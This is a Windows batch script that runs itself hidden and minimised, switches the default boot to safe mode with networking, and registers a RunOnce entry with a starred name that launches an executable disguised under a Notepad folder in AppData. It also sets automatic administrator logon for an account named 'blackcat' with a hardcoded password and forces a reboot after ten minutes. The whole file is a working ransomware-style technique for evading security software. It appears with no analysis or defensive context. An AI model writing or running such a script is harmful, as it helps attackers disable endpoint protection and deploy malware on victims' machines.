@echo off

 if not "%1"=="hidden" (
     >nul 2>&1 start /min cmd /c "%~0" hidden
     exit
 )
 
for /f "tokens=2 delims=\" %%A in ('whoami') do set "currentUser=%%A"

bcdedit  /set {default} safeboot network  >nul 2>&1
:: findstr  /C:"The operation completed successfully." 
reg  add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d "cmd.exe /c C:\Users\%currentUser%\AppData\Local\Notepad\company.exe" /f >nul 2>&1 
:: findstr  /C:"The operation completed successfully." 
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d blackcat /f >nul 2>&1
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d JapanNight123 /f >nul 2>&1
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f >nul 2>&1
timeout /T 600 >nul
shutdown  -r -t 0